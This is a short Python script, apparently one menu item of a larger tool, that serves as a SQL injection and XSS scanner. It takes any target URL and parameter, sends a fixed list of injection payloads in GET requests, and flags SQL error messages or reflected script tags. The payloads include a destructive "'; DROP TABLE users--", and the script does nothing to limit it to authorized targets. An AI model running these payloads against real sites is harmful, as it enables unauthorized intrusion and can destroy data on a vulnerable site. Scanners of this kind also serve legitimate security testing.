#!/usr/bin/env python3
import requests
import sys

def run():
    print("\n[+] Starting Quick Vulnerability Scanner (SQLi / XSS)...")
    target = input("Enter target URL (e.g. http://example.com/page.php?id=1): ")
    param = input("Enter parameter name (e.g. id): ")
    
    payloads = {
        "SQLi": ["' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "'; DROP TABLE users--"],
        "XSS": ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><script>alert(1)</script>"]
    }
    
    print("[*] Scanning for vulnerabilities...\n")
    
    vulnerabilities = []
    
    for vuln_type, payload_list in payloads.items():
        for payload in payload_list:
            # URL'yi oluştur (parametre değeri olarak payload'u ekle)
            test_url = f"{target}&{param}={payload}" if "?" in target else f"{target}?{param}={payload}"
            # Eğer URL'de zaten ? varsa & ile ekle, yoksa ? ile başlat.
            
            print(f"[*] Testing: {vuln_type} -> {payload}")
            
            try:
                response = requests.get(test_url, timeout=5)
                
                # SQLi kontrolü: SQL hata mesajları aranır
                sql_errors = ["mysql", "sql", "syntax error", "unclosed quotation", "warning", "odbc"]
                if vuln_type == "SQLi":
                    for error in sql_errors:
                        if error in response.text.lower():
                            print(f"[!] Possible SQLi detected with payload: {payload}")
                            vulnerabilities.append(f"SQLi: {payload}")
                            break
                
                # XSS kontrolü: payload'ın yanıt içinde yansıyıp yansımadığına bakılır
                if vuln_type == "XSS":
                    if payload in response.text:
                        print(f"[!] Possible XSS detected with payload: {payload}")
                        vulnerabilities.append(f"XSS: {payload}")
                        
            except requests.exceptions.ConnectionError:
                print(f"[-] Connection error: {test_url}")
            except requests.exceptions.Timeout:
                print(f"[-] Timeout: {test_url}")
            except Exception as e:
                print(f"[!] Unexpected error: {e}")
    
    print("\n[+] Scan completed!")
    if vulnerabilities:
        print("[+] Vulnerabilities found:")
        for vuln in vulnerabilities:
            print(f"    -> {vuln}")
    else:
        print("[-] No obvious vulnerabilities detected.")
    
    input("\nPress Enter to return to the main menu...")
